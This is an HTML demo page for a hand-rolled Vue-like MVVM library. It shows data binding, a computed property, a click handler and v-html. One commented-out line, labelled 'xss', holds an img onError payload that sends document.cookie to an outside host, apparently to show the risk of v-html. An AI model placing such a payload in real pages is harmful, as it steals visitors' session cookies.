<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MVVM</title>
</head>

<body>
    <div id="app">
        <input type="text" v-model="school.name">
        <div>{{school.name}}</div>
        <div>{{school.age}}</div>
        <!-- 如果数据不变化，视图就不会变化 -->
        {{getNewName}}
        <!-- 我们再内部会匹配 {{}} -->
        <ul>
            <li>1</li>
            <li>2</li>
        </ul>
        <button v-on:click="change">更新操作</button>
        <div v-html="message"></div>
    </div>

    <script src="mvvm.js"></script>
    <script>
        const vm = new Vue({
            el: "#app",
            data: {
                school: {
                    name: "喵喵喵",
                    age: 10
                },
                message: '<h1>hello vue</h1>'
                // message: '<img onError="window.location.replace(\'http://i7cn.cn?token=\'+ document.cookie);" style="display:none" src="invalidPath">' // xss
            },
            computed: {
                getNewName() {
                    return this.school.name + "架构";
                }
            },
            methods: {
                change() {
                    this.school.name = "设计模式"
                }
            },
        })
    </script>
</body>

</html>
